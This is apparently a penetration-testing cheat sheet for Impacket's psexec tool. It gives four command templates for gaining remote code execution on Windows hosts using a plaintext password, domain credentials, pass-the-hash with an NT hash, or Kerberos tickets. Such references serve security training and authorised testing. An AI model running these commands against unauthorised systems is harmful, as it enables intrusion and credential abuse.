<h1 align="center">Impacket PsExec Cheat Sheet</h1>

<p align="center">
  Advanced reference guide for gaining interactive, high-privilege remote code execution (RCE) on Windows hosts using a Python-based implementation of the classic Sysinternals PsExec.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Active_Directory-111827?style=for-the-badge&logo=microsoft&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/Impacket-PsExec-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Remote_Execution-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

```
impacket-psexec Administrador:Password123@IP_OBJETIVO
```

```
impacket-psexec dominio.local/admin_user:Password123@IP_OBJETIVO
```

```
impacket-psexec -hashes :HASH_NT dominio/usuario@IP_OBJETIVO
```

```
impacket-psexec -k -no-pass dominio/usuario@IP_OBJETIVO
```
